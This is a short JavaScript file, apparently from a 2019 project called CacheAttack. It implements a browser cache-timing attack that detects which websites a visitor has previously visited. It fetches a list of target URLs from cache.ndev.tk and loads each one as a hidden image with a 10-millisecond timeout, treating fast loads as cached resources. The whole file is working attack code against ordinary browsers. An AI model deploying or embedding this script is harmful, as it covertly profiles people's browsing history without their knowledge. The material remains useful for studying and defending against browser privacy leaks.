// NDev 2019 https://github.com/NDevTK/CacheAttack
const max = 10;

async function getRules() {
let req = await fetch("https://cache.ndev.tk/rules")
let body = await req.json();
return new Map(body);
}

async function getWebsites() {
    Websites = await getRules();
    result = [];
    // Foreach website check if cached
    for (let website of Websites) {
        await ifCached(website[0]).then(_ => result.push(website[1])).catch(_ => {});
    }
    return result;
};

async function ifCached(url){
  return new Promise((resolve, reject) => {
    let img = new Image(0,0);
    img.hidden = true;
    img.onload = _ => resolve();
    img.onerror = err => reject(err);
    img.src = url;
    setTimeout(_ => {
      img.src = ""
      img.remove();
      reject("Timeout");
    }, max);
  });
}
